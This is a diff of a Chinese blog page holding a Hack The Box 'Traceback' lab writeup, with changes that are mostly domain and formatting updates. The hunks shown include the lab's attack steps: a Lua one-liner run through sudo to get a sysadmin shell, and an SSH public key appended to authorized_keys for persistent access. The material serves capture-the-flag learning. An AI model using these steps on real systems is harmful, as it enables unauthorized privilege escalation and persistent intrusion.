@@ -8,17 +8,17 @@
         <title>HTB Traceback Writeup - Leon&#39;s Blog</title><meta name="Description" content="Leon&#39;s Blog-Keep learning web security"><meta property="og:title" content="HTB Traceback Writeup" />
 <meta property="og:description" content="HTB Traceback 靶机渗透笔记" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://clq0.top/htb-traceback-writeup/" />
-<meta property="og:image" content="https://clq0.top/logo_.jpg"/>
+<meta property="og:url" content="https://blog.h4ck.fun/htb-traceback-writeup/" /><meta property="og:image" content="https://blog.h4ck.fun/logo_.jpg"/><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2020-07-12T15:29:46+08:00" />
 <meta property="article:modified_time" content="2020-07-12T15:29:46+08:00" />
+
 <meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content="https://clq0.top/logo_.jpg"/>
+<meta name="twitter:image" content="https://blog.h4ck.fun/logo_.jpg"/>
 
 <meta name="twitter:title" content="HTB Traceback Writeup"/>
 <meta name="twitter:description" content="HTB Traceback 靶机渗透笔记"/>
 <meta name="application-name" content="Leon&#39;s Blog">
-<meta name="apple-mobile-web-app-title" content="Leon&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/logo.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://clq0.top/htb-traceback-writeup/" /><link rel="prev" href="https://clq0.top/htb-blunder-writeup/" /><link rel="next" href="https://clq0.top/roarctf2020-writeup/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+<meta name="apple-mobile-web-app-title" content="Leon&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/logo.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://blog.h4ck.fun/htb-traceback-writeup/" /><link rel="prev" href="https://blog.h4ck.fun/htb-blunder-writeup/" /><link rel="next" href="https://blog.h4ck.fun/roarctf2020-writeup/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
     {
         "@context": "http://schema.org",
         "@type": "BlogPosting",
@@ -26,11 +26,11 @@
         "inLanguage": "zh-CN",
         "mainEntityOfPage": {
             "@type": "WebPage",
-            "@id": "https:\/\/clq0.top\/htb-traceback-writeup\/"
+            "@id": "https:\/\/blog.h4ck.fun\/htb-traceback-writeup\/"
         },"genre": "posts","keywords": "Penetration","wordcount":  1233 ,
-        "url": "https:\/\/clq0.top\/htb-traceback-writeup\/","datePublished": "2020-07-12T15:29:46+08:00","dateModified": "2020-07-12T15:29:46+08:00","publisher": {
+        "url": "https:\/\/blog.h4ck.fun\/htb-traceback-writeup\/","datePublished": "2020-07-12T15:29:46+08:00","dateModified": "2020-07-12T15:29:46+08:00","publisher": {
             "@type": "Organization",
-            "name": "Leon","logo": "https:\/\/clq0.top\/logo_.jpg"},"author": {
+            "name": "Leon","logo": "https:\/\/blog.h4ck.fun\/logo_.jpg"},"author": {
                 "@type": "Person",
                 "name": "Leon"
             },"description": ""
@@ -135,10 +135,10 @@
 <p>发现网站被黑了，看下源码，发现注释：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">&lt;!--Some of the best web shells that you might need ;)--&gt;
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">&lt;!--Some of the best web shells that you might need ;)--&gt;
 </code></pre></td></tr></table>
 </div>
 </div><p>直接<code>Google</code>一下，发现一个<code>webshell</code>项目：</p>
@@ -172,7 +172,7 @@
 <p>在<code>/home</code>目录发现另一个用户：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -180,8 +180,8 @@
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">$ ls -al
-total 16
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">$ ls -al
+total <span class="m">16</span>
 drwxr-xr-x  <span class="m">4</span> root     root     <span class="m">4096</span> Aug <span class="m">25</span>  <span class="m">2019</span> .
 drwxr-xr-x <span class="m">22</span> root     root     <span class="m">4096</span> Aug <span class="m">25</span>  <span class="m">2019</span> ..
 drwxr-x---  <span class="m">5</span> sysadmin sysadmin <span class="m">4096</span> Mar <span class="m">16</span> 03:53 sysadmin
@@ -191,7 +191,7 @@ drwxr-x---  <span class="m">5</span> webadmin sysadmin <span class="m">4096</spa
 </div><p>在<code>webadmin</code>目录发现：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -220,9 +220,9 @@ drwxr-x---  <span class="m">5</span> webadmin sysadmin <span class="m">4096</spa
 </span><span class="lnt">27
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">$ <span class="nb">cd</span> webadmin   
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">$ <span class="nb">cd</span> webadmin   
 $ ls -al
-total 48
+total <span class="m">48</span>
 drwxr-x--- <span class="m">5</span> webadmin sysadmin <span class="m">4096</span> Jul <span class="m">11</span> 19:20 .
 drwxr-xr-x <span class="m">4</span> root     root     <span class="m">4096</span> Aug <span class="m">25</span>  <span class="m">2019</span> ..
 -rw------- <span class="m">1</span> webadmin webadmin  <span class="m">105</span> Mar <span class="m">16</span> 04:03 .bash_history
@@ -252,29 +252,29 @@ Contact me <span class="k">if</span> you have any question.
 </div><p>没有权限查看<code>sysadmin</code>目录：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">$ <span class="nb">cd</span> sysadmin
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">$ <span class="nb">cd</span> sysadmin
 /bin/sh: 20: cd: can<span class="err">&#39;</span>t <span class="nb">cd</span> to sysadmin
 </code></pre></td></tr></table>
 </div>
 </div><p>根据历史命令可以看见用户编辑并执行了<code>privesc.lua</code>，查看：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">$ cat privesc.lua
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">$ cat privesc.lua
 os.execute<span class="o">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="o">)</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>看下<code>webadmin</code>的权限:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -283,7 +283,7 @@ os.execute<span class="o">(</span><span class="s2">&#34;/bin/sh&#34;</span><span
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">$ sudo -l
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">$ sudo -l
 Matching Defaults entries <span class="k">for</span> webadmin on traceback:
     env_reset, mail_badpass,
     <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
@@ -296,7 +296,7 @@ User webadmin may run the following commands on traceback:
 所以模仿历史命令直接执行：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -307,7 +307,7 @@ User webadmin may run the following commands on traceback:
 </span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">$ sudo -u sysadmin /home/sysadmin/luvit privesc.lua
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">$ sudo -u sysadmin /home/sysadmin/luvit privesc.lua
 sh: turning off NDELAY mode
 ls
 note.txt
@@ -325,19 +325,19 @@ sysadmin
 生成密钥对：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">ssh-keygen -t rsa -P <span class="s1">&#39;&#39;</span> -f ~/.ssh/id_rsa
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">ssh-keygen -t rsa -P <span class="s1">&#39;&#39;</span> -f ~/.ssh/id_rsa
 </code></pre></td></tr></table>
 </div>
 </div><p>然后将<code>id_rsa.pub</code>也就是公钥复制到靶机的<code>/home/webadmin/.ssh/authorized_keys</code>：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">echo</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC75Pgdeh6oZ2nsAfys/lWzVoh+NTRcC1boeU+tfdI6n6PG2K7oU3JB2cPukdbIzFmCxLi/ra9aoMT7ckm6e952dB/Q8GfjwVapbj9vAw5ZSpuK3ihQwTHfrFXqzFiYDfYFTuoRHTl5xkQIepxLh61C+ig98ClKUjoDaz7/WXiIaHhM+ClxG51TlquDBZQc+Fzyob5bBDRB1TxpYznrPsf1dMnC1qqVz6jzuq2AyQoM9pJcL73ig5aNlG/R8TpGC4fWjlSWsA30dQQRex+V3fOJRgYG0YTov+6jVKeM3DSZsWQM5phOo83iL+ICpfXGCgyflj9z9G3BUIuXV91BoVIs1JVaD/aH1I3gb5iVaOq1hlxPhZchPf5dqN/xDVB/7yEDH0sD3HIDOdroEk2b69g9FmpgGpR9x5vuQRQ3a41Jpb3MyDxVMq0Y7UHi2Kue9JASZsKFZaHKh2KnDELaoy9zwuRHRr623KKqd3vvYGinPgYUUOwGgabwwRyKQT3NGWc<span class="o">=</span> root@kali &gt;&gt; /home/webadmin/.ssh/authorized_keys
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">echo</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC75Pgdeh6oZ2nsAfys/lWzVoh+NTRcC1boeU+tfdI6n6PG2K7oU3JB2cPukdbIzFmCxLi/ra9aoMT7ckm6e952dB/Q8GfjwVapbj9vAw5ZSpuK3ihQwTHfrFXqzFiYDfYFTuoRHTl5xkQIepxLh61C+ig98ClKUjoDaz7/WXiIaHhM+ClxG51TlquDBZQc+Fzyob5bBDRB1TxpYznrPsf1dMnC1qqVz6jzuq2AyQoM9pJcL73ig5aNlG/R8TpGC4fWjlSWsA30dQQRex+V3fOJRgYG0YTov+6jVKeM3DSZsWQM5phOo83iL+ICpfXGCgyflj9z9G3BUIuXV91BoVIs1JVaD/aH1I3gb5iVaOq1hlxPhZchPf5dqN/xDVB/7yEDH0sD3HIDOdroEk2b69g9FmpgGpR9x5vuQRQ3a41Jpb3MyDxVMq0Y7UHi2Kue9JASZsKFZaHKh2KnDELaoy9zwuRHRr623KKqd3vvYGinPgYUUOwGgabwwRyKQT3NGWc<span class="o">=</span> root@kali &gt;&gt; /home/webadmin/.ssh/authorized_keys
 </code></pre></td></tr></table>
 </div>
 </div><p>然后使用：<code>ssh -i id_rsa webadmin@10.10.10.181</code>即可登录靶机：</p>
@@ -389,7 +389,7 @@ sysadmin
         <div class="post-info-line">
             <div class="post-info-md"></div>
             <div class="post-info-share">
-                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://clq0.top/htb-traceback-writeup/" data-title="HTB Traceback Writeup" data-hashtags="Penetration"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://clq0.top/htb-traceback-writeup/" data-hashtag="Penetration"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://clq0.top/htb-traceback-writeup/"><i class="fab fa-reddit fa-fw"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://clq0.top/htb-traceback-writeup/" data-title="HTB Traceback Writeup"><i class="fab fa-weibo fa-fw"></i></a></span>
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://blog.h4ck.fun/htb-traceback-writeup/" data-title="HTB Traceback Writeup" data-via="Le0nsec" data-hashtags="Penetration"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://blog.h4ck.fun/htb-traceback-writeup/" data-hashtag="Penetration"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://blog.h4ck.fun/htb-traceback-writeup/"><i class="fab fa-reddit fa-fw"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://blog.h4ck.fun/htb-traceback-writeup/" data-title="HTB Traceback Writeup"><i class="fab fa-weibo fa-fw"></i></a></span>
             </div>
         </div>
     </div>
@@ -408,7 +408,7 @@ sysadmin
                 Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
             </noscript></div></article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line"><a>本网站由</a><a href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral" target="-blank"><img src="/upyun_logo2.png" width="4%" style="vertical-align:middle"></a><a>提供CDN加速/云存储服务</a></div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="http://clq0.top" target="_blank">Leon</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="http://clq0.top" target="_blank">Leon</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
                     <span class="icp"><script type="text/javascript" src="https://s9.cnzz.com/z_stat.php?id=1278765080&web_id=1278765080"></script></span></div>
         </div>
     </footer></div>
